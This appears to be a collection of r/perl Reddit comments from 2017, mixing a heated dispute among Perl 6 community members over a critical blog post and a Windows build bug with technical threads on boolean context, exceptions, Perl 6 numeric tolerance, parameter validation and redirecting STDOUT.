&gt; \#Perl6 is THE most welcoming place in the Internet. Oh yeah, people *love* [being called a "pet ape"](http://colabti.org/irclogger/irclogger_log/perl6?date=2017-02-02#l1102). I see that the rest of the channel doesn't care. Wonder why that is.
This is nothing but a shameful smear-piece. Full of half-facts and manufactured insinuations. &gt; Apparently, publicly announcing my support for Learning Perl 6 makes me "brian's pet". Why the insult? Oh that's not at all what makes you it. What you never bothered to point out in your little scribble is your shinannigans in bdfoy's private repository when I was trying to report errors in bdfoy's code examples and he was deleting my replies and you were happy as a clam thumbing up his responses and thumbing down anything I've said. You've done all that for no good reason other than to appease bdfoy, hence your well-earned insult. Is it any surprise you produced this article just a few days after that incident? If you really wanted "to be helpful by pointing out what the devs are missing," you wouldn't post a mocking tweet, misrepresenting stability of Perl 6 by displaying errors you got from a random dev commit instead of a tested release. You would instead report the issues you encountered in [proper bug trackers](http://rt.perl.org/). You end your article with... &gt; But, until Perl 6 developers accept input from people who are not members of their tribe more gracefully, I will stay away. ...using me as a prime example of the "evil" Perl 6 developers, yet you may notice my grant you linked to mentions work for the benefit of bdfoy—a person who's not only a non-member of the Perl 6 "tribe" but with whom I had a personal vendetta for nearly a decade now—yet, the technical issues of his book are being addressed and his tickets are [resolved the same day](https://github.com/perl6/roast/issues/219). Where are the tickets you created with all this input Perl 6 developers are supposedly rejecting? Yeah... thought so...
&gt; your shinannigans in bdfoy's private repository when I was trying to report errors in bdfoy's code examples and he was deleting my replies and you were happy as a clam thumbing up his responses and thumbing down anything I've said. You've done all that for no good reason other than to appease bdfoy, hence your well-earned insult. This is nonsense: The only thing I thumbed down was the issue you opened where you complained about the brace style he was using. As a general rule, I consider arguments about bracing style, indentation, tabs vs spaces, Emacs vs Vim etc to be unproductive. So, I thumbed down your issue. It served no purpose. Plus, your appeal to Larry Wall's authority to tell an author to change his bracing style definitely rubbed me the wrong way. Given that you brought it up, here is the issue you raised. I thought this was more than a little passive aggressive and expressed my opinion by down voting your issue. I have no power to delete anything in brian's repo. Here's what you said: &gt; Unsure if these were discussed already, but the book uses a very unique, unusual, and I'd even argue confusing placement of closing brackets: &gt; *snip code snippet* &gt; I've never seen any programmers use this style and a vastly more common style is to align the closing brace with the start of the line where the corresponding opening brace is located. &gt; Larry Wall [himself wishes this unusual brace style was changed][1] &gt; &amp;lt;TimToady&amp;gt; .oO(if I had access to bdfoy's repo I'd fix the outdents on closing brackets...) &gt; Please consider using a more common style. As for: &gt; If you really wanted "to be helpful by pointing out what the devs are missing," you wouldn't post a mocking tweet, misrepresenting stability of Perl 6 by displaying errors you got from a random dev commit instead of a tested release. I think you missed the fact I pointed out that the *tested release*, i.e. 2017.01 would *not* build out of the box on Windows due to [this bug][2] ([screenshot][3]). If you are looking for the straw that broke the camel's back, that's the one. [1]: https://irclog.perlgeek.de/perl6/2017-01-26#i_13993790 [2]: https://github.com/MoarVM/MoarVM/commit/357438a99c63c2caa7c927e60dac16ee2e60a3a7#diff-c62c27f5e5a1685d74e427c9a639f10a [3]: https://www.nu42.com/2017/02/rakudo-star-2017-01-build-problem.png
&gt; When he asked how to install from source That is a misstatement: I never asked anyone about how to build from source. I can figure that out myself and I did. See also my comment [here][1]. [1]: https://news.ycombinator.com/item?id=13438835
&gt; Your original tweet was posted on January 4th This is not very hard. I tweeted that screenshot. I was told to wait for the release. I wait for the release. Out of the box, the release doesn't build. I fix that. After building the release, I realize the problem is still there. Also, I find out there is no way to signal EOF using keyboard input. I had already discovered you all were fine calling me brian's pet. I write the blog post where I summarize my experiences.
I use lock_keys() sometimes, especially when I work/maintain legacy code that uses hashes in a messy way. In Python it raises a KeyError on accessing hash(dict) with a nonexist key. I really like that feature. I know Perl's way of permitting nonexist keys has its own merits, but I do think we need a simple way to do the similar thing as in Python. For many times I've seen in people's Perl code bugs caused by typo in the hash keys. Also, the lock_xxx() methods have been long existing in Perl core. If you brutally remove them, you would definitely break some Perl programs. I wonder if there are ways to improve it without changing the existing interface, and in the meanwhile provide some other new and better things. 
For the record not all 325 people on #perl6 are "fine" with this whole situation. I really do not care at all about the various interpersonal relationships between you two and Brian D Foy, I cannot imagine anything less interesting to me looking at using Perl 6. It would be really quite great if this could resolved privately rather than producing a huge public fiasco that has little to do (at this point) about building Perl 6 from source on Windows or resolving those issues. The reality is that build issues are routinely and pleasantly resolved constantly on #perl6 as there are plenty of people trying exotic builds. I have trouble just on OSX with clang every time Apple upgrade XCode. The spat you two are having is quite far removed from normal interactions on channel or even normal "I'm starting perl6". You can get a binary to play with it or just throw up a Docker, you can even use https://glot.io/new/perl6 to just play in the cloud. If all you're interested in is trying Perl 6 and getting a feel for the language. Trying to build from source on Windows is not the most common use case for someone coming fresh to the language. How many people build Perl 5 on Windows? I imagine Strawberry Perl or ActiveState is the most common route. Can we put some perspective on this whole thing and stop talking in general terms for a community that numbers over 300 people not 3 publicly shouty people. /u/SinanUnur if you are still interested in working through this stuff, I'm happy to try and follow your build steps on Windows 10 and see what happens for me. Clearly no one else is having similar issues with Windows, especially as jnthn devs there routinely. Is this simply because he's using the MINGW build you mentioned?
&gt; /u/SinanUnur if you are still interested in working through this stuff, I'm happy to try and follow your build steps on Windows 10 and see what happens for me. Didn't vote, but honestly, i'd have preferred if this had been the only content of your post. Please try to focus on extracting good for everyone, instead of trying to prove anyone wrong? Also, there are details in this github issue. Maybe you can try reproducing as well? jnthn already did successfully. https://github.com/MoarVM/MoarVM/issues/519
See [MoarVM/issues/519][1]. [1]: https://github.com/MoarVM/MoarVM/issues/519#issuecomment-277140732
Do you mean "Mac OS" or "macOS"? Because it's not OSX anymore it's macOS... Mac OS "Classic" is the olde one. Just to be extra confusing. So the post is asking about [macOS Sierra (10.12)](https://en.wikipedia.org/wiki/MacOS_Sierra) not the ancient version of the OS. At least that's what my build output is from (10.12.2). I ran out of steam getting anywhere. Plus my setup is fairly far from vanilla macOS.
Yeah it is super confusing. Guess I'll have to start assuming that people are referring to the Unix-based OS.
He isn't exactly saying to use the indentation style though (as I understand). Just promoting it by exposure. I can understand the reaction of both sides.
It should be possible to do so. There have been suggestions to have Hash::Util::lock_keys swap the underlying implementation of the hash, for instance. The other option is to have any new implementation also support locking keys.
[removed]
&gt; My point is you are mostly helping for your specific build situation, even if following the instructions.... &gt; If you want your build to work, why would you expect that to have a critical type response from a team already producing Windows binaries successfully? I don't understand this comment. First, isn't this enlightened self-interest often described as one of the benefits of F/OSS? Bug reports with reproduction instructions, test cases, and/or patches to improve behavior across multiple systems and platforms seem useful to me! Sinan's done a lot of great work improving Windows portability for Perl, and that suggests to me that he has a lot of time and insight that could also help Rakudo. Second, it's baffling to me that improved Windows support isn't the *first* priority of Rakudo. If one goal is still to make a high quality first language for people, you have to support the platforms where the people are. This is especially important when your language is actively trying to recruit new developers to add more libraries, increase portability, write documentation, improve build and installation instructions, et cetera. Maybe I'm confused about the goals of Rakudo. It wouldn't be the first time.
`\U`, hope that answers your question
The bug and the insults are entirely different events the OP commingled together to further his agenda. You're quick to yell at us about our self interests, by assuming everything the OP said is true as are the reasons for people's behaviour he invented.
Serious question, what does \U mean?
`\U&lt;regex&gt;` basically matches iff `&lt;regex&gt;` is matched and the match only contains uppercase letters (hence my pun attempt)
it is true that 1. people did give him responses other than "repro steps please so i can make a bug ticket" 2. nobody spoke out publicly against your insult until it was made an issue 3. a lot of other things were said that did not directly and noticably work towards fixing a bug anything else you think i commented on i did not
It's also true that: 1. OP posted tweets mocking Perl 6 for failing specification tests, even though the tests he ran are unvetted future proposals. 2. OP posted a series of screenshots mocking Perl 6 for its issues that are not present in a tested release. 3. OP was informed a tested release has a workaround for the issue, after I inquired about the bug with the release manager, who at the time was certain the issue was already filed. 4. No one asked the OP for repro steps because the issue was already reproed by me 5. There isn't a single bug report from the OP and he explicitly states in his article he can't be bothered to make them or to join ANY of the available communication channels with Perl 6 developers. So when in his piece he says "Perl 6 developers refuse to take input" the actual reality is "Zoffix told me to use a tested release in response to my tweet". As for the insults, it's also true that: 1. OP was not in the channel at the time it was made and I imagine most people active at the time had no idea who or even what a `nanis` is. Any conflicts brewing in the channel [*are* spoken out against](https://irclog.perlgeek.de/perl6/2017-01-18#i_13943123). 2. The time span between the bug tweet and the insult is **22 DAYS**, while the OP tries to paint the picture that he was insulted *because* he "reported" an issue. 3. OP and I had a heated argument on a worthiness of a particular $10,000 TPF grant proposal, where I spoke out against its approval and the grant eventually was not approved. 4. OP posts his piece days after TPF approves another grant that I proposed, liberally sprinkling references to that grant in his post paired with me calling him a "pet". Considering #3, is this really a coincidence? Quite a different picture than what OP presents in his article, isn't it? These kind of attacks are nothing new to the Perl 6 community. It survived through years and years of hearing "it's vapourware", "it's fucked", giving a Perl 6 talk and having the conf organizer say "well, nice if it ever happens", some folks trying to undermine it all by proposing a Perl 7, and so many more things. And even now, when someone wrote a smear piece to exact revenge due to a failed grant you SHOUT in bold caps at us about our self-interests while Mr. Chromatic is putting more fuel in the fire on the sidelines in comments on this very thread. So who's the real villain here? Are Perl 6 developers really high-fiving each other over the latest cat emoji while refusing to accept reports of real problems or is some individual got butt hurt over TPF grants? No longer interested. Adieu.
&gt; Exactly, as I pointed out in my post. And, it turns out the tested release was a disaster No it wasn't. You were caught red-handed fabricating lies and now you're just trying to cover up that fact with more lies. Your [tweet](https://twitter.com/sinan_unur/status/816304327761547264) about the bug is dated **Jan 3,** which is 18 days **before** the release you claim I told you to use. The tested release at that time was 2016.11, which doesn't have the problem. &gt; Where I come from, people still carry out real, bloody, murderous vendette. [...] You really haven't experienced an actual heated argument. Again more threats from someone caught red-handed while trying to play the victim. &gt; And, you might to keep this paragraph in mind So? You told the Foundation their $10,000 is a risky investment. Your twitter feed and personal blog is full of articles pointing out flaws in Perl 6 and how "they" don't know wtf they're doing. Why should that paragraph surprise me? &gt; You are confused. What am I confused about? You talk shit about Perl 6 in your blog. You talk shit about Perl 6 in your tweets. And now you wrote another blog post talking shit about Perl 6 developers. The dates in your post don't match up. You deliberately misrepresented events to stir up some drama and mar Perl 6 like you have been doing for the past three years. You got 27 points on this post and 38 comments, so job well done, eh?
This week I'm working on a game library management system for tabletop game conventions.
Yeah, that part could merit some mention of when one would actually want to force boolean context, as it does not explain the actual consequences of that context difference. What do you think, u/mr_chromatic?
I'd be interested - I understand why you'd want to force scalar/list context, but I'm not sure I can think of a situation where my $return = $x; vs. my $return = !!$x; Because in either case - if I'm just evaluating truthiness, then I'm getting the same outcome. 
Easy example: grep. The grep function returns a list of the elements that match the test in list context and the count of the elements that match in scalar context. The code know going in what it needs to return, so you can either waste the time and space copying all of those scalars just to do a count on the array at the end, or you can just keep a count of which ones matched. A benchmark for the worst case scenario (all items match the test): scalar: 100 list: 100 1000 items Rate list scalar list 117028/s -- -58% scalar 276193/s 136% -- 10000 items Rate list scalar list 116711/s -- -56% scalar 263160/s 125% -- 100000 items Rate list scalar list 105233/s -- -60% scalar 263161/s 150% -- Here is the code: #!/usr/bin/perl use strict; use warnings; use Benchmark; my @a = map { rand } 1 .. 100; my %subs = ( list =&gt; sub { # worst case scenario my @a = grep { 1 } @a; return scalar @a; }, scalar =&gt; sub { my $count = grep { 1 } @a; return $count; }, ); for my $sub (keys %subs) { print "$sub: ", $subs{$sub}(), "\n"; } for my $n (1_000, 10_000, 100_000) { my @a = map { int rand 10 } 1 .. $n; print "\n$n items\n\n"; Benchmark::cmpthese -2, \%subs; } 
Whoops, I misread your question. The main benefits I see are: 1. you don't leak an internal value out of the function 2. you provide a predictable value 3. it takes less memory An example of 1 is checking to see if the user has a credit card. You could just return the credit card number if you find it, but that would leak the credit card number to parts of the code that don't need to see it. Better to return a true or false value instead. 2 is really just a subset of 1. A nice predictable value is handy. [`!!$x` results in `PL_sv_yes` if `$x` is true or `PL_sv_no` if `$x` is false](http://perldoc.perl.org/perlguts.html). These are globally accessible variables, so no extra memory is needed to hold them (at least initially). If the consumer is a flow control statement, then no extra storage is needed at all. It is also an obvious savings if `$x` is a multi-gigabyte string.
As other comments have covered why this works, I'll also add: Despite several builtin language features utilizing it, you should avoid writing context sensitive functions yourself, both because of this confusion as well as because it can lead to easy traps (such as the big hoodoo about parameters in CGI.pm in Bugzilla a few years ago). my %things = ( thing1 =&gt; foo(), thing2 =&gt; bar(), ); If `foo` is a context-sensitive function, you have invoked it in list context, and if that returns an empty list or an even number of elements, you've now made `thing2` into a value instead of a key, screwing up your whole hash. Another common occurrence of this issue is function arguments, as they are also evaluated in list context regardless of the `=&gt;` fat comma operator. I wrote [a Perl::Critic policy](https://metacpan.org/pod/Perl::Critic::Policy::Freenode::Wantarray) that explains the issue as well. Note that `return;` with no arguments is context sensitive and can lead to the same issues, such as returning an empty list in the example above.
rational numbers will make a lot of accountants happy 
If you return something from a sub with the intention of it being a boolean, it's good to not let the caller mistreat the value (if contains a true value which is also something else, like an object or a string). You're also signaling to the reader of the sub what's going on.
Well, lets assume I'm convinced it matters. (I'm not entirely convinced). But that being so - you're using `!!` which is a little bit obscure, and in a false case - will return `dualvar ( 0, '' );` which is a level of complexity that ... well, the situation just doesn't warrant, when `return 0;` more than adequately describes your intent in a way that's clear to future maintenance programmers, and is even less likely to induce wackiness. 
The numeric precision is important, especially in scientific computing, but the rest of it... \*shrug\* I'm also not a fan of exceptions, but I guess I have to learn to love them, eventually. I never saw a problem with this pattern, in 5: if (open my $fh, '&lt;', $some_file) { do stuff on file; close $fh; } else { printf STDERR "Could not open %s: %s\n", $some_file, $!; }
The problem is when that open call occurs 6 levels deep in subroutines/object methods, and the top level is a web app that needs to know how it should respond to the user. Exceptions work as an encapsulated form of "bail out to the level that cares about this". The larger issue with the exception pattern in Perl 5 IMO is that the `eval` method of trapping exceptions has numerous pitfalls and issues, which you can find detailed in the [Try::Tiny](https://metacpan.org/pod/Try::Tiny#BACKGROUND) docs. Try::Tiny is also imperfect (but as good as it can be for a backwards-compatible pureperl solution), but there is now a new module called [Syntax::Keyword::Try](https://metacpan.org/pod/Syntax::Keyword::Try) which is implemented in a sane, efficient manner, and acts as one would expect try/catch/finally to act based on other languages.
I've seen constructs like my %args = ( default =&gt; 'value', (special =&gt; $params{$special}) x !! $extra_args, ); which is shorter and less repetitive than $extra_args ? special =&gt; $params{$special} : () but evaluates the left hand side of `x` even if the expression is false, which means you can't use it for expressions with side effects.
Gotta be totally honest; I don't use it and don't really ever intend to unless something crazy happens. To clarify, I actually don't have some kind of intense hatred for it or anything. Quite the contrary -- I find some of the choices interesting and find many features arguably useful, but I very much dislike that it's still called 'perl.' I think that was and is a terrible decision and will continue to be detrimental to both Perl 5 and Perl 6 as go-to tools in the future. I think Perl 6 has severely "damaged the brand" so to speak which is a shame because I think it could have had a strong footing had it been approached in a different way. Given the opportunity to reboot the language, I think a lot of future problems got ignored to fix past problems in convoluted ways. Instead of focusing on delivering something really underappreciated that will become very fundamental (like Go for instance) we got a more-useful-but-really-just-incompatible version of the same thing we have had for years. I guess there is still time for it to blossoml; I'll be around.
I think it is fine to extend this pattern in Perl 5, as long as you can make use of a consistent and useful try/catch implementation like Syntax::Keyword::Try (or such a thing in core, perhaps). Try::Tiny is widely used, but a little too awkward to work for that purpose generally, in my opinion. It's kind of sad that this hasn't been solved in the past 30 years, but of course Perl 5 has widely been used for simple tasks with no need of complicated call-stacks or exceptions. Now that style is becoming more popular with other languages with native try/catch implementations like JavaScript, and more modern web frameworks and asynchronous programming where exceptions tend to make things simpler.
I agree with all of your points, plus the following. The decision to share the name also damages Perl 6's "brand", as much of the target audience of Perl 6 will have preconceptions about what "perl" is which don't really apply, and they will look no further. Just look at any programming subreddit outside of the perl echo chamber and you can find that stigma is as prevalent as ever. Also I feel that the PR in general has been a disaster. The books coming out now will help with that, but from the "I'm not a serious language" logo to the "launch" that nobody knew happened, many opportunities to get people interested in the language have passed by. On a positive note, I am very interested in its proper support for threading, as Perl 5 has a long background of horrible threading implementations that made what is already a intensely complicated paradigm into an useless waste of effort. I still think that most "threading" problems can be well-solved with forks and event loops, but there are some cases where a sane (and real) threads option would be nice.
Orders of magnitude slower. Not just 10x slower. More zeros.
That's got nothing to do with here-documents. It's also got nothing to do with the contents of the data you're printing. Perl is telling you that you've got a stray 0x1c character (an ASCII control character, file separator) in the source code on column 40 of the specified line. You must have accidentally inserted it. Configure your text editor to show control characters and you should see it so that you can delete it. 
I really like that article, btw. Scary stuff!
Probably because Perl also covers a lot of sysadmin jobs, which are generally quite well paid if you are senior enough. Perl showed up in another article a few months back about highest paid programming skills, but I think it was distorted by the senior sysadmin roles. Bash was also a well paid programming language by the same measure.
Depends which bit. There is a lot in bio informatics. And a lot of places where it's the automation glue in some seriously large scale systems. But even as a perl aficionado, I don't think there are a vast number of dedicated programmer jobs out there. But probably quite a few where it's a useful auxiliary skill. (E.G. Sysadmin roles)
Saving this for my drive home later today. Regex
Glad you ask. Since numbers with infinite precision does not exist, so 0.33 refers to a number somewhere around 0.3300000000..., by convention we mean [0.325, 0.335). That is the caveat behind 0.33 and 0.20 or any real number. These caveat carries to the answer. Depend on the precision bound, the answer of 0.5 may be more correct than 0.53. -- if you have trouble following my last sentence, there is this case: try give me a range estimate of how many countries are there in Africa. Most folks will give me incorrect answer even though this question is rather trivia. ... a range of 1..1000 will be a very correct answer. Of course if you say 50 I wouldn't call you wrong (unless there is money involved); in fact, it is quite admirable. The point is, the answer may be correct or wrong critically depending on our mutual understanding of the caveat. Caveat are important that our school system fails to teach.
It's more likely that a text editor or some form of copy-paste inserted those fancy quote characters. As others have said, hex editors, xxd, or sprintf with %x can show you what's really in the file. If you have high-bit characters directly in your source code, you should usually include `use utf8;` near the top of the file so they get decoded; in this case, that would make the error message make more sense, but it wouldn't fix the problem, as fancy quotes are still not valid perl syntax.
&gt; So rather than represent the number in ratios, it should store the number along with its precision. [Removed incorrect preamble; hopefully the following still makes sense without any preamble.] Values of the `Rat` type are limited to 63 bit denominators. If you want *arbitrary precision rationals*, use `FatRat`s: my $pi= FatRat.new: |3.1415926535897932384626.nude; if 0.1*$pi + 0.2*$pi != 0.3*$pi {print "We STILL have a problem!\n"} No problem [ETA: other than the misleading sense that the mathematical pi is rational, which it isn't, regardless of precision]. &gt; For my scientific computing, I always have this epsilon involved in all my floating number comparisons. Typically I use 1e-6 and it can be a good default until user manually override. When handling numbers it is often best to use operators that explicitly work approximately such as [approximately equal](https://docs.perl6.org/language/operators#infix_=~=): &gt; The approximately-equal operator. Calculates the relative difference between the left-hand and right-hand sides and returns True if the difference is less than `$*TOLERANCE` (which defaults to 1e-15). However, if either side is zero then it checks that the absolute difference between the sides is less than `$*TOLERANCE`. Note that this operator is not arithmetically symmetrical (doesn't do ± Δ): my $x = 1; say ($x + $*TOLERANCE) =~= $x; # False say ($x - $*TOLERANCE) =~= $x; # True
It depends on the type of shop a lot. Lots of the tools I end up using are written in Go, mostly for docker and aws
 C:\&gt; type yağmur print("It's raining!\n"); C:\&gt;python3.6.exe yağmur It's raining! C:\&gt; ruby yağmur ruby: Invalid argument -- ya?mur (LoadError) C:\&gt; ruby -v ruby 2.3.1p112 (2016-04-26 revision 54768) [x64-mswin64_120] C:\&gt; perl6 yağmur It's raining! So, the `ruby` version I have is a little old. I don't know how the more recent versions fare. &gt; both Perl 5 and Perl 6, right? For `perl`, my wrapper does that. With Perl 6, I have been able to change a small number of lines in MoarVM to integrate the functionality. There is still one typo I need to fix in my pull request. I am also running into some linking issues with MinGW. I feel like I am missing something very elementary but I don't use the toolchain very often. If anyone can point out the problem, it would be much appreciated. ~~UPDATE: *ARGH!* All the test programlets in `build/probe.pm` need to be rewritten to use `wmain` because I am adding `-municode` for `gcc`. But, of course, on non-Windows systems with `gcc`, that is going to be problematic.~~ ~~UPDATE 2: My solution was to leave `-municode` out of `ldflags` for the probes and add it right before generating the `Makefile`. We'll see if that works in general.~~
Sounds like you want to match any occurrence, like a global match. Typical with a regex you could write it as /hello/gi So this would be a cases insensitive global match for the word hello. You can drop the i if you don't need it. 
Direct links to video to help the phone people: smol: http://video.fosdem.org/2017/K.4.201/image.vp8.webm yuge: http://video.fosdem.org/2017/K.4.201/image.mp4
So you used Docker tools written in Perl, which are now rewritten in Go?
Nice idea. Been tracing some memory leaks at $work, mostly using [Devel::MAT](https://metacpan.org/pod/Devel::MAT). Since whatever triggers the leak causes rapid memory usage (several MBytes/sec) the dump files are usually in the GB range, so I've had to resort to a C++ version of the parser I hacked together a while ago to speed things up, and make it easier to analyse partial data: https://github.com/tm604/pneumatic
[removed]
A script to upload artifacts to Artifactory based upon naming standards and file/directory structure. 
Are you tied to grep for any reason? I use this pattern often with a hash of the parameters (which may be what you want anyways to get named parameters): my %params = @_; my @missing; foreach my $param (qw/number name zip address/) { if (!exists($params{$param}) { push @missing, $param; } } if (scalar(@missing) &gt; 0) { my $ret_string = join(', ', @missing); print "Missing required parameters: $res_string\n"; } You can modify this to suit your needs, I like to return an error to the caller as soon as the first missing required parameter is detected. 
The problem is that you're really asking for a nested loop. In order to determine if something is a member of an array requires an inner loop. One way to do that is to use the smartmatch operator: use experimental 'smartmatch'; if (my @missing = grep { !($_ ~~ @params) } qw! number name zip address !) { print "Missing required parameters: @{[ join(', ', @missing) ]}\n"; } But this is not great. Firstly, the smartmatch operator is controversial and you might not want to depend on features that are deemed experimental and might be changed in later versions. (The operator was originally added without fully thinking through the semantics, which turned out to be a bad idea, and so now it's considered a regrettable decision that one day might be reversed.) And this is still an O(n^(2)) operation which is not ideal. (For a handful of values it doesn't really matter.) It would be much better to express the params as a set of hash keys. my @params = ('number', 'name', 'zip'); my %params; @params{@params} = (); if (my @missing = grep { not exists $params{$_} } qw! number name zip address !) { print "Missing required parameters: @{[ join(', ', @missing) ]}\n"; } Still kind of clunky, but at least it's not O(n^(2)). 
&gt; my $x = 1; &gt; say ($x + $*TOLERANCE) =~= $x; # False &gt; say ($x - $*TOLERANCE) =~= $x; # True ... and you are not bothered by this? 
You may find [perlretut](https://metacpan.org/pod/distribution/perl/pod/perlretut.pod) useful. Particularly the [section on global matching](https://metacpan.org/pod/distribution/perl/pod/perlretut.pod#Global-matching).
http://search.cpan.org/~drolsky/Params-Validate-1.26/lib/Params/Validate.pm
From the article: # my $scalar = 1, 2, 3; # Nope! Well, it works for me...
That makes more sense...but remember missing values could be (and probably would be) empty strings.
Larry Wall specified and implemented the approximately equal operator's semantics. Here is his code copy/pasted directly from [the Rakudo source](https://github.com/rakudo/rakudo/blob/nom/src/core/Numeric.pm#L252-L261): multi sub infix:&lt;≅&gt;(\a, \b, :$tolerance = $*TOLERANCE) { # If operands are non-0, scale the tolerance to the larger of the abs values. # We test b first since $value ≅ 0 is the usual idiom and falsifies faster. if b &amp;&amp; a &amp;&amp; $tolerance { abs(a - b) &lt; (a.abs max b.abs) * $tolerance; } else { # interpret tolerance as absolute abs(a.Num - b.Num) &lt; $tolerance; } } (`$*TOLERANCE` defaults to 1e-15.) This makes sense to me. What problem do you see?
The one-liner above ( https://www.reddit.com/r/perl/comments/5t3uvn/grepping_out_the_missing_parameters/ddjyjii/ ) is the way to go, but keep in mind, mojolicious will be handing you a hash reference not a hash, so.. $params{$_} would be $params-&gt;{$_} But really, I just test 'em as I use 'em instead of when I get the hashref. EDIT: lol. Looked for an example, first thing I see? sub update_user { # put my $self = shift; my $log = $self-&gt;app-&gt;log; my $db = $self-&gt;mysql-&gt;db; $log-&gt;trace("BEGIN"); my $email = $self-&gt;session('email'); my $param = $self-&gt;req-&gt;body_params-&gt;to_hash; my $rv = $db-&gt;query( q{update user set name = ?, height = ?, reminder_ind = ?, mobile_co_id = ?, mobile_nbr = ?, time_zone = ?, dashboard_date = CURRENT_TIMESTAMP() where email = ?} , $param-&gt;{'new_name'}, $param-&gt;{'new_height'}, $param-&gt;{'reminder_ind'}, $param-&gt;{'new_mobile_co'}, $param-&gt;{'new_mobile_nbr'}, $param-&gt;{'new_time_zone'}, $email ) or $log-&gt;logdie; *Because all the data is validated client-side using js, and they can't get here unless they've already filled in all the required fields, numbers are numbers, etc...* ( the obvs. question then is, "Should I trust the UI folks?", to which the answer is "NO", although in this special case, I *am* the UI person too, I trust myself a little... ) 
Thanks for posting this. continuing my comments above, this is the module I use when I'm not doing the checks on the client side, ( or don't trust the other UI folk write on the client side. )
This is a really good idea!
&gt; my $date_1 = new DateTime (year =&gt; 2014, month =&gt; 7, day =&gt; 5); I don't know how prevalent it is these examples but I'd avoid the [indirect object notation](http://modernperlbooks.com/mt/2009/08/the-problems-with-indirect-object-notation.html) examples. EDIT: It is pretty pervasive: ./Digest/MD5/addfile.pl ./YAPE/HTML/script.pl ./Math/BigInt/Named/script.pl ./Math/BigInt/Named/English/script.pl ./Perl/Critic/script.pl ./Unicode/String/script.pl ./Parse/CSV/script.pl ./Parse/CSV/umlaute.pl ./Parse/HTTP/UserAgent/script.pl ./Email/MIME/script.pl ./DateTime/script.pl ./DateTime/Format/Strptime/script.pl ./Geo/Coordinates/Transform/small_number.pl ./Geo/Coordinates/Transform/script.pl ./Geo/Coder/HostIP/script.pl ./Algorithm/Diff/script.pl ./Text/CSV/script.pl ./Text/CSV/read_with_header.pl ./Text/CSV/write_csv.pl ./Text/TabularDisplay/script.pl ./XML/Parser/script.pl ./XML/Parser/parse_string.pl ./XML/Tidy/script.pl ./XML/LibXML/script.pl ./Image/Magick/Annotate.pl ./HTTP/MobileAgent/script.pl ./HTTP/DetectUserAgent/script.pl ./HTTP/BrowserDetect/script.pl ./ExtUtils/Installed/script.pl ./YAML/Tiny/script.pl ./Net/FTP/put-some-files.pl ./Net/FTP/ls-vs-dir.pl ./Net/FTP/login-with-Net-Netrc.pl ./Net/FTP/File/script.pl ./Net/FTP/Recursive/script.pl ./Data/HexDump/script.pl ./Data/Translate/script.pl ./MP3/Tag/script.pl ./MP3/Info/script.pl ./List/Compare/script.pl ./HTML/Parser/script.pl ./HTML/LinkExtractor/script.pl ./HTML/LinkExtractor/download-content-of-linked-pages.pl ./HTML/TreeBuilder/script.pl ./HTML/ParseBrowser/script.pl ./HTML/TableExtract/script.pl ./PDF/API2/rectangles-and-circles.pl ./File/MergeSort/script.pl ./File/LibMagic/script.pl ./File/Type/script.pl ./File/Fetch/script.pl ./Devel/Symdump/script.pl ./Win32/Process/List/script.pl ./Win32/GUI/script.pl ./Win32/GUI/SetWindowsPos_HWND_TOPMOST.pl ./Win32/GUI/event_handler.pl ./GD/script.pl ./GD/ttf.pl ./GD/line.pl ./GD/white-red-green-blue.pl ./GD/Graph/histogram/script.pl ./GD/Graph/bars/min_max_temperature.pl ./GD/Graph/bars/script.pl ./WWW/Mechanize/Firefox/eval_in_page.pl ./WWW/Mechanize/Firefox/selector.pl ./WWW/Mechanize/Firefox/xpath.pl ./MIME/Lite/script.pl ./Mobile/UserAgent/script.pl ./Archive/Extract/script.pl ./IO/Socket/echo-server.pl ./IO/Socket/echo-client.pl ./IO/Socket/INET/can_read_test.server.pl ./IO/Socket/INET/can_read_test.client.pl ./LWP/UserAgent/script.pl ./URI/Find/script.pl 
Not all module authors are immediately responsive, or even interested in having such big examples in their dists. As such it can be useful to have these available out-of-band. Maybe some people could start work on packaging those into real patches, adding them to the docs or docs+eg dirs.
&gt; Does common sense expect to see asymmetry in the approximate equal comparisons? YMMV but I didn't assume anything about the operator before I read its description, other than that it approximates equality and that, this being a Perl, I could override it if I wanted to. And I found out I was right. :) &gt; Further more, does common sense expect a number's precision bound change depending on which other number it is comparing to? Same deal. I found I naturally assumed nothing about the approximation operator beyond its basic function, and I knew I could override it if I wanted to. &gt; No real world implementation can have infinite precision. [Etc.] I apologize for not previously reacting to this narrative which you've written about throughout your posting in this thread. I think it's obviously true so I had neglected to say anything until this point. Now, to be clear, I will say so. Yes, sure, I completely agree with this point. &gt; So the fix -- if needed, practically it is only necessary occasionally -- is simple, just apply a fixed precision to floating number. First, agreed, a variant is only needed occasionally. Further, the user must know when this case applies. In Perl 6 you can write and apply your own version of the `≅`operator. Bingo. Occasional problem solved. &gt; Larry doesn't have this problem (of too much precision) so he does not really understand this problem, so he fixes it with his math education sense. You're barking up the wrong tree. Whatever else is going on here I know Larry ain't fixing nothing with "math education sense" instead of properly understanding how to design an approximate equals operator for use with floats and non-floats. &gt; edit: Let me make an example: Adding `my`s so it compiles: my $*TOLERANCE = 0.01; my $a = 0.001; my $b = 0.002; say $a =~= 0; # True say $b =~= 0; # True say $a =~= $b; # False &gt; I have a question about the code: as long as $tolerence is non-zero, the first branch will be taken, right? So what is the point of second branch if $tolerence is zero? From the docs: &gt; Note that setting $*TOLERANCE = 0 will cause all comparisons to fail. { my $*TOLERANCE = 0; say 1 =~= 1; # False } This is a deliberate design decision. Like the asymmetry. You can always write your own implementation of `≅` if you want.
Thanks for engaging in the conversation :)
Generally, when a file handle goes out of scope (or the program ends), all file handles will be closed and flushed. So you don't need to do this, if your program's ending. However, if you do have a long-running program, where you are keeping the file handle around, if you want to ensure that all your data is written to the file/STDOUT, you need to make sure that it does get closed at some point (either by calling close on the file handle, or letting the handle go out of scope (if you're using STDOUT as a handle, then I don't know what the scoping details of this are). In general, I feel it's best if you're done with the thing, to close the handle.
OK, I'm just confused because STDOUT is special in a way, and by doing this I can do: print "example"; and it prints to file.out instead of the terminal. I guess I'll close it at the very end to be safe.
Hmmm. Can you post the code? I mean, STDOUT should be only going to file.out if you're specifically redirecting it there via a pipe, or in perl. I'm not a crazy expert in Perl or anything, but AFAIK, that shouldn't normally be happening unless you to a &gt; file.out. EDIT: Sorry; I've had a few. Your literal topic title explains this. Right. I'd close that, yes, to be sure. Definitely at the end of your program, though, it will flush this handle, so if it's short-running, it shouldn't matter, I don't think. You can also flush the handle if you ever do need the data to actually get written out without closing it by using IO::Handle http://perldoc.perl.org/IO/Handle.html, or the autoflush mechanism.
